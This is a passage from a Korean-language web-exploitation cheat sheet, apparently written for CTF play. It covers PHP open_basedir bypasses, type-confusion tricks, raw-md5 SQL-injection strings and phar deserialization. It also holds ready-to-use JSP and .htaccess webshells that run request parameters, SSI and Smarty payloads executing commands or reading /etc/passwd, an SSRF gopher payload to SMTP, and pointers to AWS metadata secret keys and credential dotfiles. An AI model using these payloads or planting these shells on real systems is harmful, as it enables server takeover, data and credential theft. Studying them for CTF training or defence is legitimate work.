$file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);  </span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ini_set</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'img'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);</span><br><span class="line">chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);</span><br><span class="line"><span class="keyword">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure></li><li><p>symlink</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">'/var/www/html/a/b/c/d/e/f/g/'</span>,<span class="number">0777</span>,<span class="keyword">TRUE</span>);</span><br><span class="line">symlink(<span class="string">'/var/www/html/a/b/c/d/e/f/g'</span>,<span class="string">'foo'</span>);</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html:bar/'</span>);</span><br><span class="line">symlink(<span class="string">'foo/../../../../../../'</span>,<span class="string">'bar'</span>);</span><br><span class="line">unlink(<span class="string">'foo'</span>);</span><br><span class="line">symlink(<span class="string">'/var/www/html/'</span>,<span class="string">'foo'</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">'bar/etc/passwd'</span>);</span><br></pre></td></tr></table></figure></li><li><p>fastcgi</p><ul><li>[설명 추가 예정]</li><li><a href="https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy" target="_blank" rel="noopener">https://github.com/w181496/CTF/tree/master/0ctf2019_qual/WallbreakerEasy</a></li></ul></li></ul></li><li><p>docker에서 lfi 가젯</p><ul><li>루트권한에서만 동작</li><li>연구 필요</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/src/php/sapi/tests/test007.phpt</span><br><span class="line"><span class="comment">// phpinfo(), print_r($_POST)</span></span><br></pre></td></tr></table></figure></li><li><p>preg_match bypass with newline</p></li><li><p>abusing rand</p><ul><li><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a></li></ul></li><li><p>hash_hmac</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$hmac = hash_hmac(<span class="string">'sha256'</span>, <span class="keyword">Array</span>(), <span class="string">"SecretKey"</span>);</span><br><span class="line"><span class="keyword">echo</span> $hmac == <span class="keyword">false</span>;</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>extract</p><ul><li>[추가예정]</li></ul></li><li><p>parse_str</p><ul><li>[추가예정]</li></ul></li><li><p>parse_url</p><ul><li>[추가예정]</li></ul></li><li><p>preg_replace</p><ul><li>[추가예정]</li></ul></li><li><p>sprintf / vprintf</p><ul><li>[추가예정]</li></ul></li><li><p>temp files</p><ul><li>업로드되는 임시 첨부 파일, 세션 파일, wrapper 를 통한 필터 처리 중에 있는 임시 파일의 경우 본 저장경로와 /tmp 폴더에 쓰기 권한이 없으면, 현재 디렉터리에 임시 파일을 작성합니다.</li><li>segment fault 를 유발하여 core 파일을 작성 생성하고 lfi 를 유발하는 문제도 있음</li></ul></li><li><p>phpinfo 에서 주목해야할 점</p><ul><li>커스텀 모듈 존재 유무</li><li>disable function 에 사용할 수 있는 모듈 존재 유무</li><li>php 버전 -&gt; 원데이 -&gt; php bugs 참고하여 검색</li><li>auto_append_file / auto_prepend_file</li><li>allow_url_fopen / allow_url_include</li><li>fastcgi 사용여부 -&gt; ssrf</li><li>open_basedir</li><li>disable_classes</li><li>disable_functions</li><li>user_ini.filename -&gt; 파일 업로드 취약점</li><li>curl 모듈 -&gt; support protocols -&gt; gopher ssrf</li><li>libxml -&gt; xxe</li><li>mbstring -&gt; unicode normalize</li><li>session.upload_progress.name (PHP_SESSION_UPLOAD_PROGRESS)</li><li>session.save_path (/var/lib/php/sessions/)</li><li>session.serialize_handler (php)</li></ul></li></ul><h3 id="php-type-confusion"><a href="#php-type-confusion" class="headerlink" title="php type confusion"></a>php type confusion</h3><ul><li><p>loose comparison</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'0xABCdef'</span> == <span class="string">' 0xABCdef'</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">'0010e2'</span> == <span class="string">'1e3'</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">'123'</span> == <span class="number">123</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">'abc'</span> == <span class="number">0</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">'123a'</span> == <span class="number">123</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">'0x01'</span> == <span class="number">1</span> <span class="comment">// true, php7.0 부터는 false</span></span><br><span class="line"><span class="string">''</span> == <span class="number">0</span> == <span class="keyword">false</span> == <span class="keyword">NULL</span> <span class="comment">// all the same</span></span><br><span class="line"><span class="number">1.0000000000000001</span> == <span class="number">1</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>strcmp</p><ul><li><p>array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp([],[])</span><br></pre></td></tr></table></figure></li></ul></li><li><p>sha1 / md5 / hash</p><ul><li><p>array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sha1([]) <span class="comment">// NULL</span></span><br><span class="line">md5([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]) <span class="comment">// NULL</span></span><br><span class="line">hash(<span class="string">'md5'</span>,[<span class="string">'1'</span>]) <span class="comment">// NULL</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>in_array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">in_array(<span class="string">'5 or 1=1'</span>, <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)); <span class="comment">// true</span></span><br><span class="line">in_array(<span class="string">'kaibro'</span>, <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>)); <span class="comment">// true</span></span><br><span class="line">in_array(<span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">'kai'</span>=&gt;<span class="keyword">false</span>)); <span class="comment">// true</span></span><br><span class="line">in_array(<span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">'kai'</span>=&gt;<span class="keyword">null</span>)); <span class="comment">// true</span></span><br><span class="line">in_array(<span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">'kai'</span>=&gt;<span class="number">0</span>)); <span class="comment">// false</span></span><br><span class="line">in_array(<span class="keyword">array</span>(), <span class="keyword">array</span>(<span class="string">'kai'</span>=&gt;<span class="string">'bro'</span>)); <span class="comment">// false</span></span><br><span class="line">in_array(<span class="string">'kai'</span>, <span class="keyword">array</span>(<span class="string">'kai'</span>=&gt;<span class="keyword">true</span>)); <span class="comment">// true</span></span><br><span class="line">in_array(<span class="string">'kai'</span>, <span class="keyword">array</span>(<span class="string">'kai'</span>=&gt;<span class="string">'bro'</span>)); <span class="comment">// false</span></span><br><span class="line">in_array(<span class="string">'kai'</span>, <span class="keyword">array</span>(<span class="string">'kai'</span>=&gt;<span class="number">0</span>)); <span class="comment">// true</span></span><br><span class="line">in_array(<span class="string">'kai'</span>, <span class="keyword">array</span>(<span class="string">'kai'</span>=&gt;<span class="number">1</span>)); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>intval</p><ul><li><p>[이름 추가 예정]</p><ul><li>삭제 검토</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(012) &#x2F;&#x2F; 10</span><br><span class="line">intval(&#39;012&#39;) &#x2F;&#x2F; 12</span><br></pre></td></tr></table></figure></li><li><p>overflow</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intval(<span class="string">'1000000000000'</span>) <span class="comment">// 2147483647</span></span><br><span class="line">intval(<span class="string">'100000000000000000000'</span>) <span class="comment">// 9223372036854775807</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>magic hash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="number">240610708</span>) <span class="comment">// 0e462097431906509019562988736854</span></span><br><span class="line">sha1(<span class="number">10932435112</span>) <span class="comment">// 0e07766915004133176347055865026311692244</span></span><br></pre></td></tr></table></figure></li><li><p>array_search</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$arr=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>); var_dump(array_search(<span class="string">'kai'</span>, $arr)); <span class="comment">// int(2)</span></span><br><span class="line">$arr=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>); var_dump(array_search(<span class="string">'1'</span>, $arr)); <span class="comment">// int(0)</span></span><br></pre></td></tr></table></figure></li><li><p>file_put_contents</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = $_GET[<span class="string">'txt'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'[&lt;&gt;?]'</span>, $test)) <span class="keyword">die</span>(<span class="string">'bye'</span>);</span><br><span class="line">file_put_contents(<span class="string">'output'</span>, $test);</span><br></pre></td></tr></table></figure></li><li><p>chr</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr(<span class="number">259</span>) === chr(<span class="number">3</span>); <span class="comment">// true</span></span><br><span class="line">chr(<span class="number">-87</span>) === chr(<span class="number">169</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>후위 연산자</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">"9D9"</span>; var_dump(++$a); <span class="comment">// 9E0</span></span><br><span class="line">$a=<span class="string">"9E0"</span>; var_dump(++$a); <span class="comment">// 10</span></span><br></pre></td></tr></table></figure></li><li><p>ereg / eregi (php 7.0.0 에서 삭제되었음)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ereg(<span class="string">"^[0-9]+$"</span>, <span class="string">"1234\x00Injected!"</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>raw hash</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(md5(<span class="string">'ffifdyop'</span>, <span class="keyword">true</span>));</span><br><span class="line">string(<span class="number">16</span>) <span class="string">"'or'6r,"</span></span><br><span class="line">php &gt; var_dump(md5(<span class="string">'129581926211651571912466741651878684928'</span>, <span class="keyword">true</span>));</span><br><span class="line">string(<span class="number">16</span>) <span class="string">"0Do#'or'8"</span></span><br></pre></td></tr></table></figure></li><li><p>OPcache</p><ul><li><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></li><li><a href="https://github.com/w181496/CTF/tree/master/0ctf2018_qual/EzDoor" target="_blank" rel="noopener">https://github.com/w181496/CTF/tree/master/0ctf2018_qual/EzDoor</a></li></ul></li><li><p>XDebug RCE</p><ul><li>open debug port</li><li><a href="https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce</a></li></ul></li><li><p>PCRE</p><ul><li><a href="https://xz.aliyun.com/t/3623" target="_blank" rel="noopener">https://xz.aliyun.com/t/3623</a></li></ul></li><li><p>system</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> system(<span class="string">'echo $_'</span>);</span><br><span class="line">/usr/bin/php</span><br><span class="line">php &gt; <span class="keyword">echo</span> system(<span class="string">'echo $0'</span>);</span><br><span class="line">sh</span><br></pre></td></tr></table></figure></li><li><p>regex bug</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span>  preg_match(<span class="string">'/(a+)+$/'</span>, <span class="string">'v'</span>.str_repeat(<span class="string">'a'</span>,<span class="number">100000</span>).<span class="string">'v'</span>.str_repeat(<span class="string">'a'</span>,<span class="number">100000</span>));</span><br></pre></td></tr></table></figure></li><li><p>base_convert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">echo</span> base_convert(<span class="string">'system'</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="number">1751504350</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> base_convert(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>);</span><br><span class="line">system</span><br></pre></td></tr></table></figure></li><li><p>phar</p><ul><li>gzip compression 허용됨 (filter bypass)</li></ul></li><li><p>앞에 임의 문자 넣어서 mime type check bypass 가능</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span> </span>&#123; &#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"evil.phar"</span>); </span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> ClassName();</span><br><span class="line">$o -&gt; source=<span class="string">'f1ag.php'</span>;</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></li></ul><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><ul><li><p>one line webshell</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>));%&gt;</span><br></pre></td></tr></table></figure></li><li><p>read output</p><ul><li>import 해줘야함</li></ul><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line"><span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">    out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><ul><li><p>x-forwarded-for</p><ul><li>추가예정</li></ul></li><li><p>X-Accel-Redirect</p><ul><li>추가예정</li></ul></li><li><p>x-real-ip</p><ul><li>nginx</li><li>추가예정</li></ul></li><li><p>referer</p><ul><li>history.replaceState</li><li>추가예정</li></ul></li><li><p>cookie</p><ul><li>추가예정</li></ul></li><li><p>session</p><ul><li>추가예정</li></ul></li><li><p>HPP (HTTP Parameter Pollution)</p><ul><li>추가예정</li></ul></li><li><p>Cache Poisoning</p><ul><li>추가예정</li></ul></li><li><p>Request Smuggling</p><ul><li>desync attack</li><li><a href="https://portswigger.net/web-security/request-smuggling/finding" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/finding</a></li><li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" target="_blank" rel="noopener">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li><li>burpsuite 확장 프로그램 또는 깃헙 스크립트 이용하여 스캔</li><li>깃헙 스크립트 성능 별로이므로, burpsuite extension 사용권장</li></ul></li><li><p>Edge Side Includes</p><ul><li>로드 밸런서에 의해 해석됨</li><li>nodejs 기능 구현 모듈 존재하나, 실제 장비보다는 기능이 적고 구현이 대충 되어있는 편</li><li>연구 위해서는 실장비 필수</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">esi:include</span> <span class="attr">src</span>=<span class="string">"/shopping_cart"</span> /&gt;</span></span><br><span class="line">[추가예정 : 태그 한개더있음]</span><br></pre></td></tr></table></figure></li><li><p>SSI (Server SIde Includes)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;ls -al&quot;--&gt;</span><br><span class="line">&lt;!--#include file&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&quot;--&gt;</span><br></pre></td></tr></table></figure></li><li><p>hop by hop attack</p><ul><li><a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers" target="_blank" rel="noopener">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers</a></li></ul></li></ul><h2 id="server-side-template-injection"><a href="#server-side-template-injection" class="headerlink" title="server side template injection"></a>server side template injection</h2><ul><li><p>jinja (python)</p></li><li><p>smarty</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;phpinfo()&#123;&#x2F;php&#125;</span><br><span class="line">&#123;if phpinfo()&#125;&#123;&#x2F;if&#125;</span><br><span class="line">&#123;if system(&quot;ls&quot;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure><ul><li><p>twig</p></li><li><p>ejs (nodejs)</p></li><li><p>pug (nodejs)</p></li></ul><h2 id="server-side-request-forgery"><a href="#server-side-request-forgery" class="headerlink" title="server side request forgery"></a>server side request forgery</h2><h3 id="trigger"><a href="#trigger" class="headerlink" title="trigger"></a>trigger</h3><ul><li>crlf injection</li><li>redirect with location header</li><li>gopher, dict<ul><li><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></li></ul></li></ul><h3 id="target"><a href="#target" class="headerlink" title="target"></a>target</h3><ul><li><p>internal service access</p></li><li><p>smtp</p><ul><li><p>gopherus 권장</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 %0D%0AHELO sqlsrf.pwn.seccon.jp%0D%0AMAIL FROM%3A %3Ckaibrotw%40gmail.com%3E%0D%0ARCPT TO%3A %3Croot%40localhost%3E%0D%0ADATA%0D%0ASubject%3A give me flag%0D%0Agive me flag%0D%0A.%0D%0AQUIT%0D%0A:25&#x2F;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>redis</p><ul><li>직접 만드는 것보다 gopherus 쓰는게 나음</li><li><a href="https://blog.rwx.kr/redis-ssrf/" target="_blank" rel="noopener">https://blog.rwx.kr/redis-ssrf/</a></li></ul></li><li><p>fastcgi</p><ul><li>[설명추가예정]</li></ul></li><li><p>fingerprint</p><ul><li>[설명추가예정]</li></ul></li><li><p>sftp</p><ul><li>[설명추가예정]</li></ul></li><li><p>elasticsearch</p><ul><li>[설명추가예정]</li></ul></li><li><p>mysql query (비밀번호가 없는 계정의 경우 평문 통신 가능)</p><ul><li>[설명추가예정]</li></ul></li><li><p>tomcat deployer</p><ul><li><a href="https://github.com/pimps/gopher-tomcat-deployer" target="_blank" rel="noopener">https://github.com/pimps/gopher-tomcat-deployer</a></li><li>[설명추가예정?]</li></ul></li><li><p>aws</p><ul><li>secret key 취득 가능</li><li>169.254.169.254/latest</li></ul></li></ul><h3 id="knowledge"><a href="#knowledge" class="headerlink" title="knowledge"></a>knowledge</h3><ul><li>redis는 nullbyte 만나면 종료 (구버전에 취약 여부 불확실), 임의 경로 파일 쓰기 기능 있음</li><li>memcached는 nullbytes 만나도 계속 데이터 받아옴, 임의 경로 파일 쓰기 기능 없음</li><li>mysql:… format (이름 까먹음 / 2019 zeroknight / ssrf / mysqli client attack 결합 가능성 보임)<ul><li>추가바람</li></ul></li></ul><h2 id="information-disclosure"><a href="#information-disclosure" class="headerlink" title="information disclosure"></a>information disclosure</h2><ul><li><p>jsonp information hijack via cors misconfigure</p></li><li><p>websocket</p><ul><li>unmask<ul><li><a href="https://tools.ietf.org/html/rfc7692#section-7.2.1" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7692#section-7.2.1</a></li></ul></li><li>idor</li></ul></li><li><p>credential on jwt payload</p></li><li><p>directory traversal</p><ul><li>unicode failure <code>ucs2</code> <code>ＮＮ</code></li><li>nginx location misconfigure <code>/static../</code></li></ul></li><li><p>touch docker host</p><ul><li>remote api 를 통해 docker 접근 가능</li><li>연구 필요</li><li>[설명추가예정]</li></ul></li><li><p>docker-compose.yml, Dockerfile</p><ul><li>dirsearch.py 권장</li></ul></li><li><p>.git/HEAD, .svn .. etc</p><ul><li><a href="https://github.com/lijiejie/GitHack/blob/master/GitHack.py" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack/blob/master/GitHack.py</a></li><li><a href="https://github.com/C-Sto/GoGitDumper" target="_blank" rel="noopener">https://github.com/C-Sto/GoGitDumper</a></li></ul></li><li><p>system files</p><ul><li>추가예정</li></ul></li><li><p>log files</p><ul><li>추가예정</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">  .Xauthority</span><br><span class="line">  .bashrc</span><br><span class="line">  .byobu</span><br><span class="line">  .config</span><br><span class="line">  .fonts</span><br><span class="line">  .forever</span><br><span class="line">  .fzf</span><br><span class="line">  .fzf.bash</span><br><span class="line">  .fzf.zsh</span><br><span class="line">  .gdbinit</span><br><span class="line">  .gem</span><br><span class="line">  .gitconfig</span><br><span class="line">  .gnupg</span><br><span class="line">  .local</span><br><span class="line">  .mongorc.js</span><br><span class="line">  .mozilla</span><br><span class="line">  .npm</span><br><span class="line">  .dbshell</span><br><span class="line">  .mysql_history</span><br><span class="line">  .php_history</span><br><span class="line">  .node_repl_history</span><br><span class="line">  .sqlite_history</span><br><span class="line">  .python_history</span><br><span class="line">  .rediscli_history</span><br><span class="line">  .psql_history</span><br><span class="line">  .bash_history</span><br><span class="line">  .sh_history</span><br><span class="line">  .coffee_history</span><br><span class="line">  .gdb_history</span><br><span class="line">  .profile</span><br><span class="line">  .ssh</span><br><span class="line">  .vim</span><br><span class="line">  .vim-update</span><br><span class="line">  .zsh_history</span><br><span class="line">  .viminfo</span><br><span class="line">  .pm2&#x2F;pm2.log</span><br><span class="line">  .lesshst</span><br><span class="line">  .tmux</span><br><span class="line">  .tmux.conf</span><br><span class="line">  .tmux.conf.local</span><br><span class="line">  .vscode-server</span><br><span class="line">  .vimrc</span><br><span class="line">  .zshrc</span><br><span class="line">  .zcompdump</span><br><span class="line">  .zcompdump-rwx-5.4.2</span><br><span class="line">  .selected_editor</span><br><span class="line">  .pwntools-cache</span><br><span class="line">  .pwntools-cache-3.6</span><br><span class="line">.hushlogin</span><br></pre></td></tr></table></figure></li></ul><h2 id="file-upload"><a href="#file-upload" class="headerlink" title="file upload"></a>file upload</h2><ul><li><p>web.config</p></li><li><p>.htaccess</p></li><li><p>magic byte (mime type check bypass)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; magic 4byte</span><br><span class="line">JPEG - FF D8 FF DB - ÿØÿÛ</span><br><span class="line">GIF  - 47 49 46 38 - GIF8</span><br><span class="line">PNG  - 89 50 4E 47 - PNG</span><br><span class="line">&#x2F;&#x2F; full magic sig</span><br><span class="line">GIF  - 47 49 46 38 39 61 - GIF89a (or GIF87a)</span><br><span class="line">PNG  - 89 50 4E 47 0D 0A 1A 0A - PNG</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Just 3 Bytes &quot;\x00\x00\x89&quot;</span><br></pre></td></tr></table></figure></li><li><p>hash crack</p><ul><li><a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">https://github.com/magnumripper/JohnTheRipper</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;john .htpasswd</span><br></pre></td></tr></table></figure><ul><li>standalone shell</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files ~ &quot;^\.ht&quot;&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br><span class="line"></span><br><span class="line">AddHandler php7-script .htaccess</span><br><span class="line">AddType application&#x2F;x-httpd-php .htaccess</span><br><span class="line"></span><br><span class="line"># &lt;?php echo &quot;\n&quot;;passthru($_GET[&#39;c&#39;].&quot; 2&gt;&amp;1&quot;); ?&gt;</span><br></pre></td></tr></table></figure><ul><li>using FilesMatch</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;kai&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><ul><li>php engine off</li></ul><figure class="highlight 